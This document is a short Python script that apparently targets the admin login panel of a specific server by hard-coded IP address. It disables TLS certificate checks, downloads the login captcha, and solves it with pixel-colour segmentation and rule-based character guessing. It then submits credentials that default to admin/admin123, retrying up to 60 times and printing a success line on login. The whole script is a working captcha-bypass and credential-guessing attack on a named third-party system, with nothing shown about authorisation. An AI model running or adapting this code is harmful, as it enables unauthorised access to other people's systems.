#!/usr/bin/env python3
"""101.201.82.174 验证码自动识别+登录"""
import urllib.request, http.cookiejar, ssl, io, re, sys, time, json
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return r.read()

def seg_chars(data):
    """主色过滤+字符分割"""
    img = Image.open(io.BytesIO(data)).convert("RGB")
    w,h = img.size
    pix = list(img.getdata())
    def is_char(p):
        r,g,b = p
        return r > 80 and r < 190 and g < 60 and b > 60 and b < 200
    cols = [sum(1 for y in range(h) if is_char(pix[y*w+x])) for x in range(w)]
    segs = []
    in_seg = False
    for i,c in enumerate(cols):
        if c > 1 and not in_seg: start=i; in_seg=True
        elif c <= 1 and in_seg:
            if i - start >= 5: segs.append((start, i-1))
            in_seg = False
    if in_seg and w-start >= 5: segs.append((start, w-1))
    # 合并太近的段
    merged = []
    for s in segs:
        if merged and s[0] - merged[-1][1] < 3:
            merged[-1] = (merged[-1][0], s[1])
        else:
            merged.append(s)
    return merged, img, is_char, w, h

def classify(seg, img, is_char, w, h):
    """简单特征分类"""
    s,e = seg
    rows = []
    for y in range(h):
        row = "".join("#" if is_char(img.getpixel((x,y))) else "." for x in range(s,e+1))
        rows.append(row)
    while rows and "#" not in rows[0]: rows.pop(0)
    while rows and "#" not in rows[-1]: rows.pop()
    if not rows: return "?"
    W = max(len(r) for r in rows)
    norm = [r + "."*(W-len(r)) for r in rows]
    H = len(norm)
    top = norm[0]; bot = norm[-1]; mid = norm[H//2]
    left_col = sum(1 for r in norm if r[0]=="#") / H
    right_col = sum(1 for r in norm if r[-1]=="#") / H
    has_top = "#" in top[:W//3] and "#" in top[-max(1,W//3):]
    has_bot = "#" in bot[:W//3] and "#" in bot[-max(1,W//3):]
    # 决策
    if W <= 3 and left_col > 0.8: return "1"  # 1
    if left_col > 0.7 and right_col > 0.7 and has_top and has_bot: return "O"
    if left_col > 0.7 and right_col > 0.7 and not has_top and not has_bot: return "H"
    if left_col > 0.7 and right_col < 0.4 and has_top and has_bot: return "E"
    if left_col > 0.7 and right_col < 0.4 and has_top and not has_bot: return "F"
    if left_col > 0.7 and not has_top and not has_bot: return "C"
    if left_col > 0.7 and has_top and not has_bot and "#" in mid[W//2:]: return "P"
    if left_col > 0.7 and has_top and has_bot and "#" in mid[W//2:]: return "B"
    if left_col < 0.3 and right_col < 0.3 and not has_top and not has_bot: return "X"
    if left_col < 0.3 and right_col < 0.3 and has_top: return "T"
    if left_col > 0.5 and right_col < 0.5 and not has_top and not has_bot: return "K"
    if left_col > 0.4 and right_col > 0.4 and not has_top and has_bot: return "A"
    if W > 10: return "W" if left_col > 0.4 else "M"
    return "?"

def login(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return json.loads(r.read().decode("utf-8","ignore"))
    except Exception as e:
        return {"status":-1,"msg":str(e)[:60]}

user = sys.argv[1] if len(sys.argv) > 1 else "admin"
pwd = sys.argv[2] if len(sys.argv) > 2 else "admin123"

for i in range(60):
    cap = get_captcha()
    segs, img, is_char, w, h = seg_chars(cap)
    if len(segs) != 4:
        print(f"[{i}] segs={len(segs)}", flush=True)
        continue
    code = "".join(classify(s, img, is_char, w, h) for s in segs)
    if "?" in code:
        print(f"[{i}] 低置信: {code}", flush=True)
    r = login(user, pwd, code)
    if r.get("status") == 1:
        print(f"!!! 登录成功 {user}/{pwd} code={code}", flush=True)
        break
    elif "验证码" in str(r.get("msg","")):
        print(f"[{i}] code={code} 验证码错", flush=True)
    else:
        print(f"[{i}] code={code} -> {r}", flush=True)
        if "验证码" not in str(r.get("msg","")) and "密码" not in str(r.get("msg","")):
            print(f"  !!! 非验证码错误: {r}", flush=True)
    time.sleep(0.3)
print("DONE")
